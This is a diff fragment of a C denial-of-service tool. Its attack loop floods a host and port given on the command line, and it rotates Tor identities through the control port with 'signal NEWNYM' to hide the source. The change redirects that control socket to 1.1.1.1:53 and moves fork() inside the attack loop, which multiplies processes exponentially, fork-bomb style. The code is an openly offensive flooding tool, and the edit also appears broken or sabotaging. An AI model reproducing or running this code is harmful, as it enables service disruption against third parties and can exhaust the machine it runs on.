@@ -79,7 +79,7 @@ void attack(char *host, char *port, int id) {
 
 void cycle_identity() {
 	int r;
-	int socket = make_socket("localhost", "9050");
+	int socket = make_socket("1.1.1.1", "53");
 	write(socket, "AUTHENTICATE \"\"\n", 16);
 	while(1) {
 		r=write(socket, "signal NEWNYM\n\x00", 16);
@@ -92,9 +92,9 @@ int main(int argc, char **argv) {
 	int x;
 	if(argc !=3)
 		cycle_identity();
-	fork();
         pid = getpid();
-	for(i=1; i < PPS; i++) {
+	for(i=0; i < PPS; i++) {
+		fork();
 			attack(argv[1], argv[2], x);
 		usleep(100000);
 		
